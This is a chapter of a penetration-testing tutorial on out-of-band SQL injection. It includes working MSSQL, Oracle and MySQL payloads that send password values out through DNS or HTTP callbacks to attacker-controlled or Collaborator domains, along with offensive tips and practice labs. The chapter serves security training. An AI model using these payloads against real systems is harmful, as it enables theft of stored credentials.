# Chapter 10 — Out-of-Band (OOB) SQL Injection

## About the Topic
OOB SQLi exfiltrates data through a **different channel** than the one
used to send the payload — typically DNS lookups or outbound HTTP requests
triggered by the database engine itself. Used when:
- In-band techniques don't work (no output rendered).
- Blind techniques are too slow (rate limiting, WAF throttling).
- The network allows outbound DNS/HTTP from the DB server (common in
  misconfigured internal networks).

## Practical Example — MSSQL DNS Exfiltration
```sql
'; EXEC master..xp_dirtree '\\attacker-controlled.oob-domain.com\a'--
```
The SQL Server attempts to resolve the UNC path, causing a DNS lookup to
the attacker's domain. Data can be embedded in the subdomain:

```sql
'; DECLARE @p VARCHAR(1024);
SET @p = (SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree ''\\' + @p + '.attacker-domain.com\a''')--
```

## Practical Example — Oracle HTTP Exfiltration
```sql
SELECT UTL_HTTP.REQUEST('http://attacker-domain.com/'
  || (SELECT password FROM users WHERE rownum=1)) FROM dual
```

## Using Burp Collaborator / Interactsh
1. Generate a unique payload domain from Burp Collaborator (or the free
   `interact.sh`).
2. Inject a payload that forces a DNS/HTTP callback to that domain.
3. Poll Collaborator for interactions — if a hit arrives, the injection is
   confirmed even with **zero visible feedback** in the app itself.
4. Extend the payload to embed extracted data in the subdomain/path of the
   callback for full exfiltration.

```sql
' AND (SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1), '.your-collaborator-id.oastify.com\\a')))--
```

## Offensive Tips
- OOB requires outbound network access from the DB server — many cloud/
  containerized environments block this by default, so test it early
  rather than assuming it will work.
- This is the go-to technique for **fully blind, zero-content-difference**
  scenarios (e.g., background job processing, async APIs).
- Always use your own unique subdomain per test so you can positively
  attribute the callback to a specific payload/parameter.

## Labs to Practice
- **PortSwigger Academy** — *Blind SQL injection with out-of-band
  interaction*, and *...with out-of-band data exfiltration* (uses Burp
  Collaborator client, built into Burp Suite).
- **TryHackMe** — rooms covering Burp Collaborator / OOB techniques.
- **HackTheBox Academy** — "SQL Injection Fundamentals" OOB section.

## Key Takeaway
OOB SQLi is the deepest fallback technique — when every other channel is
silent, DNS/HTTP callbacks can still prove and exploit the vulnerability.
